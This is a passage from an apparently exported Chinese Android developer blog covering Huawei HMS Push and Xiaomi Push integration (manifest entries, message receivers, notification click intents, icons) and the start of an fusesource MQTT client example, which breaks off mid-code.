<p>请求消息头中的Authorization参数生成请参见<a href="https://developer.huawei.com/consumer/cn/doc/development/HMSCore-Guides-V5/open-platform-oauth-0000001053629189-V5#ZH-CN_TOPIC_0000001053629189__section12493191334711" target="_blank" rel="noopener">OAuth 2.0客户端模式</a>，其中的客户端ID和客户端密钥请输入您在<a href="https://developer.huawei.com/consumer/cn/service/josp/agc/index.html" target="_blank" rel="noopener">AppGallery Connect</a>项目下的Android应用里的App ID和App Secret。</p>
<p>请求消息体示例：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"validate_only"</span>: <span class="literal">false</span>,</span><br><span class="line">    <span class="attr">"message"</span>: &#123;</span><br><span class="line">        <span class="attr">"notification"</span>: &#123;</span><br><span class="line">            <span class="attr">"title"</span>: <span class="string">"title"</span>,</span><br><span class="line">            <span class="attr">"body"</span>: <span class="string">"body"</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">"android"</span>: &#123;</span><br><span class="line">            <span class="attr">"notification"</span>: &#123;</span><br><span class="line">                <span class="attr">"title"</span>: <span class="string">"android title"</span>,</span><br><span class="line">                <span class="attr">"body"</span>: <span class="string">"android body"</span>,</span><br><span class="line">                <span class="attr">"click_action"</span>: &#123;</span><br><span class="line">                    <span class="attr">"type"</span>: <span class="number">1</span>,</span><br><span class="line">                    <span class="attr">"intent"</span>: <span class="string">"#Intent;compo=com.rvr/.Activity;S.W=U;end"</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">"token"</span>: [</span><br><span class="line">            <span class="string">"pushtoken1"</span>,</span><br><span class="line">            <span class="string">"pushtoken2"</span></span><br><span class="line">        ]</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>说明<br>通知栏消息中，如果设置了message.android.notification.title和message.android.notification.body，则会分别覆盖message.notification.title和message.notification.body。</p>
</blockquote>
<p>透传消息示例报文：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"validate_only"</span>: <span class="literal">false</span>,</span><br><span class="line">    <span class="attr">"message"</span>: &#123;</span><br><span class="line">        <span class="attr">"data"</span>: <span class="string">"&#123;'param1':'value1','param2':'value2'&#125;"</span>,</span><br><span class="line">        <span class="attr">"token"</span>: [</span><br><span class="line">            <span class="string">"pushtoken1"</span>,</span><br><span class="line">            <span class="string">"pushtoken2"</span></span><br><span class="line">        ]</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="六、Android端接收透传消息"><a href="#六、Android端接收透传消息" class="headerlink" title="六、Android端接收透传消息"></a>六、Android端接收透传消息</h3><p>集成SDK后要在 <code>AndroidManifest.xml</code> 文件的application标签下注册您自己的service，继承<a href="https://developer.huawei.com/consumer/cn/doc/development/HMSCore-References-V5/hmsmessageservice-0000001050173839-V5" target="_blank" rel="noopener">HmsMessageService</a>类并实现其中的方法，此处以DemoHmsMessageService类为例（类名由您自定义）。</p>
<p>该service用于<a href="https://developer.huawei.com/consumer/cn/doc/development/HMSCore-Guides-V5/android-client-dev-0000001050042041-V5#ZH-CN_TOPIC_0000001078601368__section161573511014" target="_blank" rel="noopener">接收透传消息</a>、<a href="https://developer.huawei.com/consumer/cn/doc/development/HMSCore-References-V5/hmsmessageservice-0000001050173839-V5#ZH-CN_TOPIC_0000001078729906__section814414561477" target="_blank" rel="noopener">获取Token</a>。</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">service</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:name</span>=<span class="string">".DemoHmsMessageService"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:exported</span>=<span class="string">"false"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">"com.huawei.push.action.MESSAGING_EVENT"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">service</span>&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.huawei.hms.push.HmsMessageService;</span><br><span class="line"><span class="keyword">import</span> com.huawei.hms.push.RemoteMessage;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DemoHmsMessageService</span> <span class="keyword">extends</span> <span class="title">HmsMessageService</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String TAG = getClass().getName();</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onNewToken</span><span class="params">(String newDeviceToken)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onNewToken(newDeviceToken);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Token会在包括但不限于下述场景中发生变化：</span></span><br><span class="line">        <span class="comment">// 1、App卸载重装；</span></span><br><span class="line">        <span class="comment">// 2、App调用注销Token接口；</span></span><br><span class="line">        <span class="comment">// 3、用户恢复出厂设置；</span></span><br><span class="line">        <span class="comment">// 4、清除应用数据；</span></span><br><span class="line">        <span class="comment">// 应用的Push Token要定期更新（建议应用每次启动的时候都获取Token，</span></span><br><span class="line">        <span class="comment">// 如果发现和上次不同取到的不同，则上报到自己的服务器）</span></span><br><span class="line">        <span class="comment">// 有了这个 DeviceToken 就可以单个推送透传消息到这个手机。</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 透传消息</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> remoteMessage</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onMessageReceived</span><span class="params">(RemoteMessage remoteMessage)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onMessageReceived(remoteMessage);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onDeletedMessages</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onDeletedMessages();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>App启动时注册推送，自动获取的 <code>newToken</code> 。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">HmsMessaging.getInstance(context).setAutoInitEnabled(<span class="keyword">true</span>);</span><br></pre></td></tr></table></figure>
<h3 id="七、代码混淆"><a href="#七、代码混淆" class="headerlink" title="七、代码混淆"></a>七、代码混淆</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-ignorewarnings</span><br><span class="line">-keepattributes *Annotation*</span><br><span class="line">-keepattributes Exceptions</span><br><span class="line">-keepattributes InnerClasses</span><br><span class="line">-keepattributes Signature</span><br><span class="line">-keepattributes SourceFile,LineNumberTable</span><br><span class="line">-keep class com.huawei.hianalytics.**&#123;*;&#125;</span><br><span class="line">-keep class com.huawei.updatesdk.**&#123;*;&#125;</span><br><span class="line">-keep class com.huawei.hms.**&#123;*;&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>hms</tag>
      </tags>
  </entry>
  <entry>
    <title>Android集成小米推送</title>
    <url>/Android/Android%E9%9B%86%E6%88%90%E5%B0%8F%E7%B1%B3%E6%8E%A8%E9%80%81/</url>
    <content><![CDATA[<h3 id="一、-开通开发者"><a href="#一、-开通开发者" class="headerlink" title="一、 开通开发者"></a>一、 开通开发者</h3><p>省略</p>
<h3 id="二、-创建应用"><a href="#二、-创建应用" class="headerlink" title="二、 创建应用"></a>二、 创建应用</h3><p>省略，创建完应用，到“推送服务”开启你的应用推送服务。</p>
<h3 id="三、-集成到Android项目"><a href="#三、-集成到Android项目" class="headerlink" title="三、 集成到Android项目"></a>三、 集成到Android项目</h3><p><a href="https://dev.mi.com/console/doc/detail?pId=41" target="_blank" rel="noopener">《Android客户端SDK集成指南》</a>。<br>小米的SDK集成还算简单，小米提供了一个简单的Demo，非常简单。</p>
<h4 id="0-引入jar包依赖"><a href="#0-引入jar包依赖" class="headerlink" title="0. 引入jar包依赖"></a>0. 引入jar包依赖</h4><p>Android的SDK以jar形式提供，放到libs目录即可。</p>
<h4 id="1-推送服务需要的权限列表："><a href="#1-推送服务需要的权限列表：" class="headerlink" title="1. 推送服务需要的权限列表："></a>1. 推送服务需要的权限列表：</h4><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">"android.permission.WRITE_EXTERNAL_STORAGE"</span> /&gt;</span>​</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">"android.permission.INTERNET"</span> /&gt;</span> </span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">"android.permission.ACCESS_NETWORK_STATE"</span> /&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">"android.permission.ACCESS_WIFI_STATE"</span> /&gt;</span> </span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">"android.permission.READ_PHONE_STATE"</span> /&gt;</span> </span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">"android.permission.VIBRATE"</span>/&gt;</span> </span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">permission</span> <span class="attr">android:name</span>=<span class="string">"com.xiaomi.mipushdemo.permission.MIPUSH_RECEIVE"</span></span></span><br><span class="line"><span class="tag"><span class="attr">android:protectionLevel</span>=<span class="string">"signature"</span> /&gt;</span> <span class="comment">&lt;!--这里com.xiaomi.mipushdemo改成app的包名--&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">"com.xiaomi.mipushdemo.permission.MIPUSH_RECEIVE"</span> /&gt;</span><span class="comment">&lt;!--这里com.xiaomi.mipushdemo改成app的包名--&gt;</span></span><br></pre></td></tr></table></figure>
<h4 id="2-推送服务需要配置的service和receiver："><a href="#2-推送服务需要配置的service和receiver：" class="headerlink" title="2. 推送服务需要配置的service和receiver："></a>2. 推送服务需要配置的service和receiver：</h4><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">service</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:name</span>=<span class="string">"com.xiaomi.push.service.XMPushService"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:enabled</span>=<span class="string">"true"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:process</span>=<span class="string">":pushservice"</span> /&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--注：此service必须在3.0.1版本以后（包括3.0.1版本）加入--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">service</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:name</span>=<span class="string">"com.xiaomi.push.service.XMJobService"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:enabled</span>=<span class="string">"true"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:exported</span>=<span class="string">"false"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:permission</span>=<span class="string">"android.permission.BIND_JOB_SERVICE"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:process</span>=<span class="string">":pushservice"</span> /&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">service</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:name</span>=<span class="string">"com.xiaomi.mipush.sdk.PushMessageHandler"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:enabled</span>=<span class="string">"true"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:exported</span>=<span class="string">"true"</span> /&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--注：此service必须在2.2.5版本以后（包括2.2.5版本）加入--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">service</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:name</span>=<span class="string">"com.xiaomi.mipush.sdk.MessageHandleService"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:enabled</span>=<span class="string">"true"</span> /&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">receiver</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:name</span>=<span class="string">"com.xiaomi.push.service.receivers.NetworkStatusReceiver"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:exported</span>=<span class="string">"true"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">"android.net.conn.CONNECTIVITY_CHANGE"</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">category</span> <span class="attr">android:name</span>=<span class="string">"android.intent.category.DEFAULT"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">receiver</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">receiver</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:name</span>=<span class="string">"com.xiaomi.push.service.receivers.PingReceiver"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:exported</span>=<span class="string">"false"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:process</span>=<span class="string">":pushservice"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">"com.xiaomi.push.PING_TIMER"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">receiver</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>这里将XMPushService和PingReceiver定义在了pushservice进程中，您也可以配置其运行在任意进程。如果没有配置android:process这个属性，那么它们将运行在应用的主进程中。</p>
<h4 id="2-自定义一个BroadcastReceiver类"><a href="#2-自定义一个BroadcastReceiver类" class="headerlink" title="2. 自定义一个BroadcastReceiver类"></a>2. 自定义一个BroadcastReceiver类</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">class MyMiPushMessageReceiver : PushMessageReceiver() &#123;</span><br><span class="line">	<span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 接收客户端向服务器发送注册命令后的响应结果</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function">override fun <span class="title">onReceiveRegisterResult</span><span class="params">(context: Context, message: MiPushCommandMessage)</span> </span>&#123;</span><br><span class="line">        Log.i(TAG, <span class="string">"onReceiveRegisterResult is called. $message"</span>)</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 透传消息</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function">override fun <span class="title">onReceivePassThroughMessage</span><span class="params">(context: Context, message: MiPushMessage)</span> </span>&#123;</span><br><span class="line">        Log.v(TAG,<span class="string">"onReceivePassThroughMessage is called. $message"</span>)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 通知消息，</span></span><br><span class="line"><span class="comment">     * 这个回调方法会在用户手动点击通知后触发</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function">override fun <span class="title">onNotificationMessageClicked</span><span class="params">(context: Context, message: MiPushMessage)</span> </span>&#123;</span><br><span class="line">        Log.v(TAG,<span class="string">"onNotificationMessageClicked is called. $message"</span>)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 通知消息到达客户端时触发。另外应用在前台时不弹出通知的通知消息到达客户端也会触发这个回调函数</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function">override fun <span class="title">onNotificationMessageArrived</span><span class="params">(context: Context, message: MiPushMessage)</span> </span>&#123;</span><br><span class="line">        Log.v(TAG,<span class="string">"onNotificationMessageArrived is called. $message"</span>)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 接收客户端向服务器发送命令后的响应结果</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function">override fun <span class="title">onCommandResult</span><span class="params">(context: Context, message: MiPushCommandMessage)</span> </span>&#123;</span><br><span class="line">        Log.d(TAG, <span class="string">"onCommandResult is called. $message"</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="3-将自定义的BroadcastReceiver注册到AndroidManifest-xml文件中"><a href="#3-将自定义的BroadcastReceiver注册到AndroidManifest-xml文件中" class="headerlink" title="3. 将自定义的BroadcastReceiver注册到AndroidManifest.xml文件中"></a>3. 将自定义的BroadcastReceiver注册到AndroidManifest.xml文件中</h5><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">receiver</span></span></span><br><span class="line"><span class="tag">  <span class="attr">android:exported</span>=<span class="string">"true"</span></span></span><br><span class="line"><span class="tag">  <span class="attr">android:name</span>=<span class="string">"com.xiaomi.mipushdemo.DemoMessageReceiver"</span>&gt;</span></span><br><span class="line">          <span class="comment">&lt;!--这里com.xiaomi.mipushdemo.DemoMessageRreceiver改成app中定义的完整类名--&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">"com.xiaomi.mipush.RECEIVE_MESSAGE"</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">"com.xiaomi.mipush.MESSAGE_ARRIVED"</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">"com.xiaomi.mipush.ERROR"</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">receiver</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h5 id="4-代码混淆"><a href="#4-代码混淆" class="headerlink" title="4. 代码混淆"></a>4. 代码混淆</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-keep class com.xiaomi.mipush.sdk.DemoMessageReceiver &#123;*;&#125;</span><br></pre></td></tr></table></figure>
<h5 id="5-注册推送"><a href="#5-注册推送" class="headerlink" title="5. 注册推送"></a>5. 注册推送</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">MiPushClient.registerPush(<span class="keyword">this</span>, APP_ID, APP_KEY);</span><br></pre></td></tr></table></figure>
<p>注册成功在回调中有regid，可以根据regid推送给指定的设备。</p>
<h3 id="四、-后台推送"><a href="#四、-后台推送" class="headerlink" title="四、 后台推送"></a>四、 后台推送</h3><p>小米有提供SDK，也有HTTP API，这里直接用API就可以。API的授权也是很简单，只需要应用的秘钥就行。</p>
<h3 id="五、-预定义通知栏消息的点击行为"><a href="#五、-预定义通知栏消息的点击行为" class="headerlink" title="五、 预定义通知栏消息的点击行为"></a>五、 预定义通知栏消息的点击行为</h3><p>通过设置extra.notify_effect的值以得到不同的预定义点击行为。</p>
<ul>
<li>“1″：通知栏点击后打开app的Launcher Activity。</li>
<li>“2″：通知栏点击后打开app的任一Activity（开发者还需要传入extra.intent_uri）。</li>
<li>“3″：通知栏点击后打开网页（开发者还需要传入extra.web_uri）。</li>
</ul>
<p>extra.notify_effect为“2”时，可以定义extra.intent_uri，生成uri代码如下：<br><figure class="highlight"><table><tr><td class="code"><pre><span class="line">Intent intent = <span class="keyword">new</span> Intent();</span><br><span class="line">intent.setAction(<span class="string">"com.xiaomi.mipushdemo.news"</span>);</span><br><span class="line">intent.setFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP);</span><br><span class="line">intent.toUri(Intent.URI_INTENT_SCHEME);</span><br><span class="line">结果：intent:#Intent;action=com.test.action.message;end</span><br></pre></td></tr></table></figure></p>
<p>经过我的小米手机测试，无法打开此action。但如果定义extra.intent_uri为以下格式的Activity，是可以打开:<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">intent:#Intent;component=com.xiaomi.mipushdemo/.NewsActivity;end</span><br></pre></td></tr></table></figure></p>
<p>只是设置的parentActivityName没有效果，打开NewsActivity点击返回就退出了，如果想退出NewsActivity进入主页则不行。</p>
<p>但还有一种方法可以实现，就是onNotificationMessageClicked函数，这个函数是点击通知栏消息的回调函数，如果没有被小米SDK处理掉的话，就会触发，我们就可以执行相关的代码。<br>如：<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Intent intent = <span class="keyword">new</span> Intent();</span><br><span class="line"><span class="comment">//这个标志位一定要加，否则无法启动（此处Context没有Activity栈）</span></span><br><span class="line">intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);</span><br><span class="line">intent.setAction(message.getExtra().get(<span class="string">"intent_uri"</span>));</span><br><span class="line">context.startActivity(intent);</span><br></pre></td></tr></table></figure></p>
<blockquote>
<p>推送时，extra.notify_effect这个参数要删掉<br>intent_uri参数填：com.xiaomi.mipushdemo.news</p>
</blockquote>
<p>这样就可以启动Action了，parentActivityName也是有效的。</p>
<h3 id="六、-定制通知栏通知的图标"><a href="#六、-定制通知栏通知的图标" class="headerlink" title="六、 定制通知栏通知的图标"></a>六、 定制通知栏通知的图标</h3><ol>
<li>非MIUI中</li>
</ol>
<ul>
<li>如果app中同时存在名为 <code>mipush_notification</code> 和 <code>mipush_small_notification</code> 的drawable文件，则使用mipush_notification的drawable作为通知的大图标，mipush_small_notification的drawable作为通知的小图标。</li>
<li>如果app中只存在其中一个drawable文件，则使用该drawable作为通知的图标。</li>
<li>如果app中不存在这两个drawable文件，则使用app的icon作为通知的图标。</li>
</ul>
<blockquote>
<p>注意：<br>mipush_notification  要求PNG/JPG/JPEG格式图片，尺寸120×120px，小于200KB。<br>mipush_small_notification  建议尺寸 60 x 60px。</p>
</blockquote>
<ol start="2">
<li>MIUI中：</li>
</ol>
<p>通知栏图标统一显示为app的icon，不可以定制 （2021-07-22无语）。</p>
<blockquote>
<p>MIUI经过了几次的修改，参考文章：<a href="https://www.zhihu.com/question/380021524/answer/1235535213" target="_blank" rel="noopener">《知乎》</a></p>
</blockquote>
<ol start="3">
<li>推送消息时指定图标</li>
</ol>
<p>从小米的推送调试工具来看，可以上传一个定制的icon，但这也太麻烦了。</p>
<p><strong>总结：也就是说，目前通知栏的图标无法定制，不用折腾了(非MIUI根本不会用小米推送好吧？)，当然app中可以提前适配定制，万一明天小米又改回来了呢？</strong></p>
<h3 id="七、-透传消息"><a href="#七、-透传消息" class="headerlink" title="七、 透传消息"></a>七、 透传消息</h3><p>小米的透传消息要求应用在后台常驻，则无法用来做离线推送。</p>
]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>hms</tag>
      </tags>
  </entry>
  <entry>
    <title>MQTT-Client库-org-fusesource-mqtt-client</title>
    <url>/Android/MQTT-Client%E5%BA%93-org-fusesource-mqtt-client/</url>
    <content><![CDATA[<p>由于不太想用Eclipse的库，寻求其他库来试试。</p>
<p><a href="https://github.com/fusesource/mqtt-client" target="_blank" rel="noopener">org.fusesource.mqtt-client</a> 也是MQTT推荐 client 端的库，github的start也有<code>500+</code>吧，fork也有<code>200+</code>。</p>
<p>引用库<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">compile &apos;org.fusesource.mqtt-client:mqtt-client:1.12&apos;</span><br></pre></td></tr></table></figure></p>
<p>作者给出了三种使用方法：<code>1.阻塞；2.非阻塞（推荐）；3.Future（没理解？）</code></p>
<h4 id="Github上的-非阻塞-示例："><a href="#Github上的-非阻塞-示例：" class="headerlink" title="Github上的 非阻塞 示例："></a>Github上的 非阻塞 示例：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">final CallbackConnection connection = mqtt.callbackConnection();</span><br><span class="line">connection.listener(new Listener() &#123;</span><br><span class="line"></span><br><span class="line">    public void onDisconnected() &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    public void onConnected() &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void onPublish(UTF8Buffer topic, Buffer payload, Runnable ack) &#123;</span><br><span class="line">        // You can now process a received message from a topic.</span><br><span class="line">        // Once process execute the ack runnable.</span><br><span class="line">        ack.run();</span><br><span class="line">    &#125;</span><br><span class="line">    public void onFailure(Throwable value) &#123;</span><br><span class="line">        connection.close(null); // a connection failure occured.</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line">connection.connect(new Callback&lt;Void&gt;() &#123;</span><br><span class="line">    public void onFailure(Throwable value) &#123;</span><br><span class="line">        result.failure(value); // If we could not connect to the server.</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Once we connect..</span><br><span class="line">    public void onSuccess(Void v) &#123;</span><br><span class="line"></span><br><span class="line">        // Subscribe to a topic</span><br><span class="line">        Topic[] topics = &#123;new Topic(&quot;foo&quot;, QoS.AT_LEAST_ONCE)&#125;;</span><br><span class="line">        connection.subscribe(topics, new Callback&lt;byte[]&gt;() &#123;</span><br><span class="line">            public void onSuccess(byte[] qoses) &#123;</span><br><span class="line">                // The result of the subcribe request.</span><br><span class="line">            &#125;</span><br><span class="line">            public void onFailure(Throwable value) &#123;</span><br><span class="line">                connection.close(null); // subscribe failed.</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        // Send a message to a topic</span><br><span class="line">        connection.publish(&quot;foo&quot;, &quot;Hello&quot;.getBytes(), QoS.AT_LEAST_ONCE, false, new Callback&lt;Void&gt;() &#123;</span><br><span class="line">            public void onSuccess(Void v) &#123;</span><br><span class="line">              // the pubish operation completed successfully.</span><br><span class="line">            &#125;</span><br><span class="line">            public void onFailure(Throwable value) &#123;</span><br><span class="line">                connection.close(null); // publish failed.</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        // To disconnect..</span><br><span class="line">        connection.disconnect(new Callback&lt;Void&gt;() &#123;</span><br><span class="line">            public void onSuccess(Void v) &#123;</span><br><span class="line">              // called once the connection is disconnected.</span><br><span class="line">            &#125;</span><br><span class="line">            public void onFailure(Throwable value) &#123;</span><br><span class="line">              // Disconnects never fail.</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>上面代码片段在Android和纯Java程序都可以执行，需要注意的是，纯Java要用一个阻塞事件（如输入）来阻止main函数结束运行。</p>
<h4 id="Android："><a href="#Android：" class="headerlink" title="Android："></a>Android：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import android.os.Bundle;</span><br><span class="line">import android.os.Handler;</span><br><span class="line">import android.os.Message;</span><br><span class="line">import android.support.annotation.Nullable;</span><br><span class="line">import android.util.Log;</span><br><span class="line">import android.view.LayoutInflater;</span><br><span class="line">import android.view.View;</span><br><span class="line">import android.view.ViewGroup;</span><br><span class="line">import android.widget.TextView;</span><br><span class="line"></span><br><span class="line">import org.fusesource.hawtbuf.Buffer;</span><br><span class="line">import org.fusesource.hawtbuf.UTF8Buffer;</span><br><span class="line">import org.fusesource.mqtt.client.Callback;</span><br><span class="line">import org.fusesource.mqtt.client.CallbackConnection;</span><br><span class="line">import org.fusesource.mqtt.client.Listener;</span><br><span class="line">import org.fusesource.mqtt.client.MQTT;</span><br><span class="line">import org.fusesource.mqtt.client.QoS;</span><br><span class="line">import org.fusesource.mqtt.client.Topic;</span><br><span class="line"></span><br><span class="line">import butterknife.BindString;</span><br><span class="line">import butterknife.BindView;</span><br><span class="line">import butterknife.ButterKnife;</span><br><span class="line">import butterknife.Unbinder;</span><br><span class="line">import cn.content.DefaultValue;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">public class FragmentMqtt extends FragmentBase &#123;</span><br><span class="line"></span><br><span class="line">    private final String TAG = getClass().getName();</span><br><span class="line">    @BindView(R.id.tv_hello)</span><br><span class="line">    TextView tvHello;</span><br><span class="line">    private Unbinder unbinder;</span><br><span class="line"></span><br><span 